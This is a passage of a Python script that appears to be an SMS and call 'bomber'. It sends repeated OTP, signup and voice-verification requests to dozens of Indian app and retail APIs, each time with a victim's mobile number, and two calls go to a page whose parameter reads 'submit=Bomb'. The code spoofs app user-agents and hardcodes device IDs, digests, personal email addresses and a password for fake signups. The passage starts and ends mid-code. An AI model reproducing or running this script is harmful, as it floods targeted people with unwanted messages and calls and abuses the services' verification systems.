        response = requests.get(
            'https://www.healthkart.com/veronica/user/validate/voice/1/9771241426/signup',
            params=params,
            headers=headers,
        )


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'MobileNo': number,
            'type': 'login',
        }

        response = requests.get('https://defencebakery.in/api/otp', params=params, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            '_ClientVersion': 'js3.4.4',
            '_InstallationId': 'e7beffbd-466a-4e88-8e8f-377b31e4782a',
            'mobileNumber': number,
            'digest': '9ef2f5395e651c77e860f12a8d966d69988e9642f9ebc9b85dac0bc84229c3a9',
            '_ApplicationId': 'myAppId',
            'source': 'android',
            'time': '2023-10-12T05:54:28.093Z',
            'deviceId': '243b0f7d0b6a1f15cdc8',
        }

        response = requests.post('https://api.cureskin.com/api/parse/functions/requestOTP', headers=headers, json=json_data);pass


        headers = {
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        params = {
            'identifier': 'callmade',
            'mobile': number,
        }

        response = requests.get('https://api.magicbricks.com/bricks/verifyOnCall.html', params=params, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'retry_mode': 'voice',
            'mobile': number,
        }

        response = requests.post('https://api.tendercuts.in/otp/retry/', headers=headers, json=json_data);pass

        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'actionRequestContext': {
                'type': 'LOGIN_IDENTITY_VERIFY',
                'loginIdPrefix': '+91',
                'loginId': number,
                'clientQueryParamMap': {
                    'ret': '/reseller-homepage-store?utm_medium=GoogleAd&utm_campaign=Google-PerfMax&cmpid=Google-PerfMax&cmpid=Google-Shopping-PerfMax2-AllProducts-India&gclid=Cj0KCQjwk96lBhDHARIsAEKO4xb159ag92ss6ZJ0PuwGTfP-_3zKG3NdBZWTSjSvOS8NEDTPDwfhSB0aAji5EALw_wcB',
                    'entryPage': 'HEADER_ACCOUNT',
                },
                'loginType': 'MOBILE',
                'verificationType': 'OTP',
                'screenName': 'LOGIN_V4_MOBILE',
                'sourceContext': 'DEFAULT',
            },
        }

        response = requests.post('https://www.shopsy.in/api/1/action/view', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'deviceType': 'web',
            'viaWhatsapp': True,
            'tel': '+91'+number,
        }

        response = requests.post('https://webapi.byjusexamprep.com/user/verify/sendOtp', headers=headers, json=json_data);pass

        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'mobile': number,
            'forgotPwdFlag': 'false',
        }

        response = requests.get('https://dash.bcykal.com/mobycy/api/user/generate/otp', params=params, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'userTitle': 'Mr.',
            'password': 'Sloe82@@',
            'countryCode': '+91',
            'mobile': number,
            'name': 'David ',
            'flashCall': 'true',
            'metaDID': '3d1b663996bf7dc7',
            'platformId': '2',
            'metaSV': '1',
            'email': 'helovogoduddub@gmail.com',
            'visitorId': '358409124',
            'metaAV': '394-3.58.2.1',
        }

        response = requests.post('https://www.winni.in/app/v3/auth/customer/signup', headers=headers, json=json_data);pass

        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'phone': number,
            'phoneLogin': 'true',
        }

        response = requests.get('https://www.skechers.in/resendotp/', params=params, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mode': 'WHATSAPP',
            'new_user': False,
            'mobile_number': number,
            'device': 'Android',
        }

        response = requests.post('https://api.countrydelight.in/api/v1/customer/requestOtp', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'deviceType': 'web',
            'viaWhatsapp': False,
            'tel': '+91'+number,
        }

        response = requests.post('https://webapi.byjusexamprep.com/user/verify/sendOtp', headers=headers, json=json_data);pass


        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobileNo': number,
            'processType': 'Login',
            'source': 'Web',
        }

        response = requests.post('https://ottmobileapis.dishtv.in/Api/NewUserManagement/GenerateOTP', headers=headers, json=json_data);pass



        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'mobile': number,
            'submit': 'Bomb',
        }

        response = requests.get('https://termux.xyz/wp-content/uploads/sms.php', params=params, headers=headers);pass



        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': f'{mobile}',
        }

        response = requests.post('https://unacademy.com/api/v3/user/user_check/', headers=headers, json=json_data);pass

       

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'retries': 0.0,
            'phone_number': f'91{mobile}',
        }

        response = requests.post('https://production.apna.co/api/userprofile/v1/otp/', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"retries":0.0,"phone_number":"91€hiru"}'.encode()
        #response = requests.post('https://production.apna.co/api/userprofile/v1/otp/', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mode': 0.0,
            'mobile': f'{mobile}',
        }

        response = requests.post('https://web.okcredit.in/api/authn/v1.0/otp:request', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"mode":0.0,"mobile":"€hiru"}'.encode()
        #response = requests.post('https://web.okcredit.in/api/authn/v1.0/otp:request', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': f'{mobile}',
        }

        response = requests.post('https://login.housing.com/api/v2/send-otp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"phone":"€hiru"}'.encode()
        #response = requests.post('https://login.housing.com/api/v2/send-otp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'otpRegistration': 'true',
            'firstName': 'error',
            'lastName': '22',
            'pincode': '380001',
            'channelType': 'android',
            'userId': f'{mobile}',
            'pincodeArea': 'Ahmedabad',
        }

        response = requests.post('https://digital.dmart.in/api/v1/secure/signup', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"otpRegistration":"true","firstName":"error","lastName":"22","pincode":"380001","channelType":"android","userId":"€hiru","pincodeArea":"Ahmedabad"}'.encode()
        #response = requests.post('https://digital.dmart.in/api/v1/secure/signup', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'resendOtp': '0',
            'phoneNumber': '7460092221',
            'hashCode': 'k387IsBaTmn',
            'name': f'{mobile}',
        }

        response = requests.post('https://services.dealshare.in/userservice/api/v1/send-otp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"resendOtp":"0","phoneNumber":"7460092221","hashCode":"k387IsBaTmn","name":"€hiru"}'.encode()
        #response = requests.post('https://services.dealshare.in/userservice/api/v1/send-otp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone_no': f'+91{mobile}',
            'website': True,
            'is_guest_checkout': False,
        }

        response = requests.post('https://prod.api.sugarcosmetics.com/users/prod/v2/sendOtp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"phone_no":"+91€hiru","website":true,"is_guest_checkout":false}'.encode()
        #response = requests.post('https://prod.api.sugarcosmetics.com/users/prod/v2/sendOtp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'payload': {
                'allowWhatsapp': False,
                'mobile': f'+91{mobile}',
            },
            'type': 'mobile',
        }

        response = requests.post('https://auth.eka.care/auth/init', headers=headers, json=json_data);pass

        

        

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone_number': f'+91{mobile}',
        }

        response = requests.post('https://api.relevel.com/api/v2/users/send-otp/', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"phone_number":"+91€hiru"}'.encode()
        #response = requests.post('https://api.relevel.com/api/v2/users/send-otp/', headers=headers, data=data)


        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobile': f'{mobile}',
        }

        #response = requests.post('https://prod.efeed.in/api/customer/sendOtp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"mobile":"€hiru"}'.encode()
        #response = requests.post('https://prod.efeed.in/api/customer/sendOtp', headers=headers, data=data)


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }
        mc = f'https://be.mcdelivery.co.in/auth/otp/{mobile}'

        response = requests.get(mc, headers=headers);pass


        


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }
        ok = f'https://be.mcdelivery.co.in/auth/otp/{mobile}/'

        response = requests.get(ok, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': f'+91{mobile}',
        }

        response = requests.post('https://us-central1-bikai-d5ee5.cloudfunctions.net/generateOTP', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"phone":"+91€hiru"}'.encode()
        #response = requests.post('https://us-central1-bikai-d5ee5.cloudfunctions.net/generateOTP', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobileNumber': f'{mobile}',
            'otpTemplateId': '5b4e2e49b70e040008ffbcbe',
        }

        response = requests.post('https://api.nnnow.com/d/apiV2/otp/generateOtp/v1/flash', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"mobileNumber":"€hiru","otpTemplateId":"5b4e2e49b70e040008ffbcbe"}'.encode()
        #response = requests.post('https://api.nnnow.com/d/apiV2/otp/generateOtp/v1/flash', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobile_number': f'{mobile}',
            'client_id': 'kisan-app',
        }

        response = requests.post('https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"mobile_number":"€hiru","client_id":"kisan-app"}'.encode()
        #response = requests.post('https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'auto_retry': False,
            'mobile_no': f'+91{mobile}',
            'allow_whatsapp': False,
        }

        response = requests.post('https://cowin.eka.care/v2/generate_otp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"auto_retry":false,"mobile_no":"+91€hiru","allow_whatsapp":false}'.encode()
        #response = requests.post('https://cowin.eka.care/v2/generate_otp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': f'+91-{mobile}',
            'app_client_id': '90391da1-ee49-4378-bd12-1924134e906e',
        }

        response = requests.post('https://identity.tllms.com/api/request_otp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"phone":"+91-€hiru","app_client_id":"90391da1-ee49-4378-bd12-1924134e906e"}'.encode()
        #response = requests.post('https://identity.tllms.com/api/request_otp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'sendOtpToWhatsApp': False,
            'loginAttemptCounter': 3.0,
            'mobileNo': f'{mobile}',
        }

        response = requests.post('https://app-api.fthdaily.in/api/v2/customers/generate-otp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"sendOtpToWhatsApp":false,"loginAttemptCounter":3.0,"mobileNo":"€hiru"}'.encode()
        #response = requests.post('https://app-api.fthdaily.in/api/v2/customers/generate-otp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': f'{mobile}',
        }

        response = requests.post('https://www.licious.in/api/login/signup', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"phone":"€hiru"}'.encode()
        #response = requests.post('https://www.licious.in/api/login/signup', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'deviceType': 'android',
            'instanceId': 'esXLqB--T2CmMBR6f4BHy9',
            'mobile': f'{mobile}',
            'whatsappConsent': True,
        }

        response = requests.post(
            'https://card.fplabs.tech:9000/onecard/bff/open/v2/register/otp/generate',
            headers=headers,
            json=json_data,
        )

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"deviceType":"android","instanceId":"esXLqB--T2CmMBR6f4BHy9","mobile":"€hiru","whatsappConsent":true}'.encode()
        #response = requests.post('https://card.fplabs.tech:9000/onecard/bff/open/v2/register/otp/generate', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'buildVersion': '24.0',
            'phone': f'{mobile}',
            'source': 'signup',
            'type': 'p',
            'device': 'mobile',
            'email': '',
        }

        response = requests.post('https://apinew.moglix.com/nodeApi/v1/login/sendOTP', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"buildVersion":"24.0","phone":"€hiru","source":"signup","type":"p","device":"mobile","email":""}'.encode()
        #response = requests.post('https://apinew.moglix.com/nodeApi/v1/login/sendOTP', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'isGupshup': True,
            'contact': f'{mobile}',
            'email': 'shivamrajput200@gmail.com',
        }

        response = requests.post('https://api.mamaearth.in/v1/auth/initiateSignup', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"isGupshup":true,"contact":"€hiru","email":"shivamrajput200@gmail.com"}'.encode()
        #response = requests.post('https://api.mamaearth.in/v1/auth/initiateSignup', headers=headers, data=data)


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        ll = f'https://www.skechers.in/resendotp/?phone={mobile}&phoneLogin=true'

        response = requests.get(ll, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'customer_mobile': f'{mobile}',
        }

        response = requests.post('https://www.nykaafashion.com/webscripts/api/otp/generate', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"customer_mobile":"€hiru"}'.encode()
        #response = requests.post('https://www.nykaafashion.com/webscripts/api/otp/generate', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'auto_retry': False,
            'mobile_no': f'+91{mobile}',
            'allow_whatsapp': True,
        }

        response = requests.post('https://cowin.eka.care/v2/generate_otp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"auto_retry":false,"mobile_no":"+91€hiru","allow_whatsapp":true}'.encode()
        #response = requests.post('https://cowin.eka.care/v2/generate_otp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': f'+91{mobile}',
        }

        response = requests.post('https://entri.app/api/v3/users/check-phone/', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"phone":"+91€hiru"}'.encode()
        #response = requests.post('https://entri.app/api/v3/users/check-phone/', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'user_id': f'{mobile}',
        }

        response = requests.post('https://www.samsung.com/in/api/v1/sso/otp/init', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"user_id":"€hiru"}'.encode()
        #response = requests.post('https://www.samsung.com/in/api/v1/sso/otp/init', headers=headers, data=data)


        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'variables': {
                'mobileNumber': f'{mobile}',
            },
            'query': 'mutation CreateAccountOTP($mobileNumber: String!) {\n  createAccountOTP(mobileNumber: $mobileNumber) {\n    status\n    message\n    __typename\n  }\n}',
            'operationName': 'CreateAccountOTP',
        }

        response = requests.post('https://www.mobex.in/graphql', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"variables":{"mobileNumber":"€hiru"},"query":"mutation CreateAccountOTP($mobileNumber: String!) {\\n  createAccountOTP(mobileNumber: $mobileNumber) {\\n    status\\n    message\\n    __typename\\n  }\\n}","operationName":"CreateAccountOTP"}'.encode()
        #response = requests.post('https://www.mobex.in/graphql', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'isPlaycircle': False,
            'mobile': f'{mobile}',
            'deviceId': '72abdd9a-7038-41c0-a57d-d0022dac60da',
            'deviceName': '',
            'refCode': '',
        }

        response = requests.post('https://www.rummycircle.com/api/fl/auth/v3/getOtp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"isPlaycircle":false,"mobile":"€hiru","deviceId":"72abdd9a-7038-41c0-a57d-d0022dac60da","deviceName":"","refCode":""}'.encode()
        #response = requests.post('https://www.rummycircle.com/api/fl/auth/v3/getOtp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobileNo': f'+91{mobile}',
            'userName': 'raghavsdss',
        }

        response = requests.post('https://khiladi.com/v1/exchange/user/userRegisterOtpSent', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"mobileNo":"+91€hiru","userName":"raghavsdss"}'.encode()
        #response = requests.post('https://khiladi.com/v1/exchange/user/userRegisterOtpSent', headers=headers, data=data)


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        og = f'https://www.mylorides.com/notifications/send_sms_to_num?mobile_num={mobile}'

        response = requests.get(og, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'isPlaycircle': False,
            'mobile': f'{mobile}',
            'deviceId': '1aeb7fad-58d0-4887-9f77-2a469039a413',
            'deviceName': '',
            'refCode': '',
        }

        response = requests.post('https://www.my11circle.com/api/fl/auth/v3/getOtp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"isPlaycircle":false,"mobile":"€hiru","deviceId":"1aeb7fad-58d0-4887-9f77-2a469039a413","deviceName":"","refCode":""}'.encode()
        #response = requests.post('https://www.my11circle.com/api/fl/auth/v3/getOtp', headers=headers, data=data)


        headers = {
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        tk =f'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={mobile}'

        response = requests.get(tk, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phoneNo': f'{mobile}',
        }

        response = requests.post('https://www.loanbaba.com/vywurpzr/MAppService.asmx/SendOTP', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"phoneNo":"€hiru"}'.encode()
        #response = requests.post('https://www.loanbaba.com/vywurpzr/MAppService.asmx/SendOTP', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'otp_mode': 'SIGNUP',
            'mobile': f'{mobile}',
        }

        response = requests.post('https://api.tendercuts.in/otp/v2/generate/', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"otp_mode":"SIGNUP","mobile":"€hiru"}'.encode()
        #response = requests.post('https://api.tendercuts.in/otp/v2/generate/', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            '_ClientVersion': 'js3.4.4',
            '_InstallationId': 'e7beffbd-466a-4e88-8e8f-377b31e4782a',
            'mobileNumber': f'{mobile}',
            'digest': '24f17c1f25f8750c556e70cab0c62e0dce7df7945b26f5a27e2570f8575dec6a',
            '_ApplicationId': 'myAppId',
            'time': '2023-10-12T05:54:59.229Z',
            'deviceId': '243b0f7d0b6a1f15cdc8',
        }

        response = requests.post('https://api.cureskin.com/api/parse/functions/retryOTP', headers=headers, json=json_data);pass

        

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mode': 'SMS',
            'new_user': True,
            'mobile_number': f'{mobile}',
            'device': 'Android',
        }

        response = requests.post('https://api.countrydelight.in/api/v1/customer/requestOtp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"mode":"SMS","new_user":true,"mobile_number":"€hiru","device":"Android"}'.encode()
        #response = requests.post('https://api.countrydelight.in/api/v1/customer/requestOtp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'ad_set_id': '',
            'device_id': '8ecdf954a6956e20',
            'ad_name': '',
            'channel': '',
            'placement_id': '',
            'ad_id': '',
            'keyword_id': '',
            'campaign': '',
            'placement': '',
            'keyword': '',
            'mobile_number': f'{mobile}',
            'ad_set_name': '',
            'campaign_id': '',
        }

        response = requests.post('https://api.cityflo.com/api/v2/users/auth/init/', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"ad_set_id":"","device_id":"8ecdf954a6956e20","ad_name":"","channel":"","placement_id":"","ad_id":"","keyword_id":"","campaign":"","placement":"","keyword":"","mobile_number":"€hiru","ad_set_name":"","campaign_id":""}'.encode()
        #response = requests.post('https://api.cityflo.com/api/v2/users/auth/init/', headers=headers, data=data)


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }
        ggg = f'https://dash.bcykal.com/mobycy/api/user/generate/otp?mobile={mobile}&forgotPwdFlag=false&type=ROLE_HERO_DRIVER'

        response = requests.get(
            ggg,
            headers=headers,
        )


       

        


        headers = {
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }
        gg = f'https://api.magicbricks.com/bricks/verifyOnCall.html?identifier=callmade&mobile={mobile}'

        response = requests.get(
            gg,
            headers=headers,
        )


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            '_ClientVersion': 'js3.4.4',
            '_InstallationId': 'e7beffbd-466a-4e88-8e8f-377b31e4782a',
            'mobileNumber': f'{mobile}',
            'digest': '9ef2f5395e651c77e860f12a8d966d69988e9642f9ebc9b85dac0bc84229c3a9',
            '_ApplicationId': 'myAppId',
            'source': 'android',
            'time': '2023-10-12T05:54:28.093Z',
            'deviceId': '243b0f7d0b6a1f15cdc8',
        }

        response = requests.post('https://api.cureskin.com/api/parse/functions/requestOTP', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"_ClientVersion":"js3.4.4","_InstallationId":"e7beffbd-466a-4e88-8e8f-377b31e4782a","mobileNumber":"€hiru","digest":"9ef2f5395e651c77e860f12a8d966d69988e9642f9ebc9b85dac0bc84229c3a9","_ApplicationId":"myAppId","source":"android","time":"2023-10-12T05:54:28.093Z","deviceId":"243b0f7d0b6a1f15cdc8"}'.encode()
        #response = requests.post('https://api.cureskin.com/api/parse/functions/requestOTP', headers=headers, data=data)


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }
        ff = f'https://dash.bcykal.com/mobycy/api/user/generate/otp?mobile={mobile}&forgotPwdFlag=false'

        response = requests.get(
            ff,
            headers=headers,
        )


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'deviceType': 'web',
            'viaWhatsapp': True,
            'tel': f'+91{mobile}',
        }

        response = requests.post('https://webapi.byjusexamprep.com/user/verify/sendOtp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"deviceType":"web","viaWhatsapp":true,"tel":"+91€hiru"}'.encode()
        #response = requests.post('https://webapi.byjusexamprep.com/user/verify/sendOtp', headers=headers, data=data)


        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'actionRequestContext': {
                'type': 'LOGIN_IDENTITY_VERIFY',
                'loginIdPrefix': '+91',
                'loginId': f'{mobile}',
                'clientQueryParamMap': {
                    'ret': '/reseller-homepage-store?utm_medium=GoogleAd&utm_campaign=Google-PerfMax&cmpid=Google-PerfMax&cmpid=Google-Shopping-PerfMax2-AllProducts-India&gclid=Cj0KCQjwk96lBhDHARIsAEKO4xb159ag92ss6ZJ0PuwGTfP-_3zKG3NdBZWTSjSvOS8NEDTPDwfhSB0aAji5EALw_wcB',
                    'entryPage': 'HEADER_ACCOUNT',
                },
                'loginType': 'MOBILE',
                'verificationType': 'OTP',
                'screenName': 'LOGIN_V4_MOBILE',
                'sourceContext': 'DEFAULT',
            },
        }

        response = requests.post('https://www.shopsy.in/api/1/action/view', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"€hiru","clientQueryParamMap":{"ret":"/reseller-homepage-store?utm_medium\\u003dGoogleAd\\u0026utm_campaign\\u003dGoogle-PerfMax\\u0026cmpid\\u003dGoogle-PerfMax\\u0026cmpid\\u003dGoogle-Shopping-PerfMax2-AllProducts-India\\u0026gclid\\u003dCj0KCQjwk96lBhDHARIsAEKO4xb159ag92ss6ZJ0PuwGTfP-_3zKG3NdBZWTSjSvOS8NEDTPDwfhSB0aAji5EALw_wcB","entryPage":"HEADER_ACCOUNT"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}'.encode()
        #response = requests.post('https://www.shopsy.in/api/1/action/view', headers=headers, data=data)


        

        
        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mode': 'WHATSAPP',
            'new_user': False,
            'mobile_number': f'{mobile}',
            'device': 'Android',
        }

        response = requests.post('https://api.countrydelight.in/api/v1/customer/requestOtp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"mode":"WHATSAPP","new_user":false,"mobile_number":"€hiru","device":"Android"}'.encode()
        #response = requests.post('https://api.countrydelight.in/api/v1/customer/requestOtp', headers=headers, data=data)


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        urllff =  f'https://appapi.apollodiagnostics.in/v1/registration/send-otp-for-registration?mobile_number={mobile}'

        response = requests.get(urllff,
            headers=headers,
        )


        
       

        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobileNo': f'{mobile}',
            'processType': 'Login',
            'source': 'Web',
        }

        response = requests.post('https://ottmobileapis.dishtv.in/Api/NewUserManagement/GenerateOTP', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"mobileNo":"€hiru","processType":"Login","source":"Web"}'.encode()
        #response = requests.post('https://ottmobileapis.dishtv.in/Api/NewUserManagement/GenerateOTP', headers=headers, data=data)


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }
        urlg  = f'https://termux.xyz/wp-content/uploads/sms.php?mobile={mobile}&submit=Bomb'

        response = requests.get(urlg, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
